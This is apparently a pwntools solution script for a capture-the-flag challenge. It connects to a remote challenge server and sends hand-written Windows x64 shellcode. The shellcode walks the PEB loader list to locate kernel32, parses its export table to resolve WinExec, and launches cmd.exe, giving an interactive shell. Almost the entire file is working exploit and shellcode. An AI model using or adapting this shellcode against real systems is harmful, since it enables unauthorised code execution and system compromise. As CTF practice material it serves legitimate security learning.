#!/usr/bin/env python3
from pwn import *

# windows 64bit
context(arch='amd64', os='linux')

context.log_level = 'debug'

# nc chall.angelboy.tw 56003
c = remote('chall.angelboy.tw', 56003)


"""
PEB->
    ldr
    -> (_LDR_DATA_TABLE_ENTRY) binary
    -> (_LDR_DATA_TABLE_ENTRY) ntdll
    -> (_LDR_DATA_TABLE_ENTRY) kernel32
"""


sc = """
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    ; get peb
    mov r15, qword ptr gs:[0x60]
    ; get ldr
    mov r14, qword ptr [r15+0x18] ; peb+0x18

    ; get first _LDR_DATA_TABLE_ENTRY (binary)
    mov r15, qword ptr [r14 + 0x20] ; pebldr+0x20
    ; note: this address
    ; _LDR_DATA_TABLE_ENTRY + 0x10 = InMemoryOrderModuleList
    ; _LDR_DATA_TABLE_ENTRY + 0x30 = Baseaddress
    ; Baseaddress = Baseaddress + 0x20
    
    ; next _LDR_DATA_TABLE_ENTRY ntdll (InMemoryOrderModuleList) 
    mov r15, qword ptr [r15]
    ; next _LDR_DATA_TABLE_ENTRY kernel32 (InMemoryOrderModuleList) 
    mov r15, qword ptr [r15]

    ; get kernel32 imagebase
    mov rdi, qword ptr [r15+0x20]

    ; find Export address table
    ;; first get NT Header from e_llfanew 0x3c
    mov esi, dword ptr [rdi + 0x3c]
    lea rsi, qword ptr [rdi + rsi] # find the NT header


    ;; get optionalHader (offset = 0x4 + 0x14 + 0x70 = 0x88, signature + file header + dataDir)
    xor r10, r10
    mov r10d, dword ptr [rsi + 0x4 + 0x14 + 0x70]
    lea rsi, qword ptr [rdi + r10]




    ; from Export dir table, 0x180 (image offset)
    ;lea rsi, qword ptr [rdi + 0x180] ; assume we can find export dir table

    ; from EDT get Address Of Name table
    xor r8, r8 # clean r8 all bit to zero
    mov r8d, dword ptr [rsi + 0x20] 
    lea r8, qword ptr [rdi+r8] ; r8 is NamePtrTable Address

    mov r12, {} ; "WinExec\\0"
    xor rcx, rcx
search: ; rcx is index
    xor rbx, rbx
    mov ebx, dword ptr [r8+rcx*4] ; get name rva
    mov rbx, qword ptr [rdi + rbx] ; get name string
    ;; check string equal then jmp
    cmp rbx, r12
    je found
    inc rcx
    jmp search

found:
    xor r8, r8 # clean r8 all bit to zero
    mov r8d, dword ptr [rsi + 0x24] 
    lea r8, qword ptr [rdi+r8] ; r8 is Ordinal table rva

    xor rbx, rbx # clean rbx all bit to zero
    xor r9,r9
    mov r9w, word ptr [r8 + rcx * 2] ; this is Export Address table index
    ; next step we need use it as index to find WinExec RVA


    xor r8, r8 # clean r8 all bit to zero
    mov r8d, dword ptr [rsi + 0x1c] 
    lea r8, qword ptr [rdi+r8] ; r8 is export address table rva

    xor rbx, rbx
    mov ebx, dword ptr [r8 + r9 * 4] ; int ExportAddressTable[r9]
    lea r8, qword ptr [rdi + rbx] ; r8 = &PE_image + WinExecRVA

    jmp cmd_exe
go:
    pop rcx
    sub rsp, 0x100
    and rsp,0xfffffffffffffff0 ; alignment 0x10
    call r8

cmd_exe:
    call go
    .ascii "cmd.exe"
    .byte 0
"""

import re
# remove all comment
sc = re.sub(r';.*', '', sc)

sc = sc.format(hex(u64(b'WinExec\0')))
print(sc)
# Shellcode:
c.sendafter("Shellcode:", asm(sc))


c.interactive()
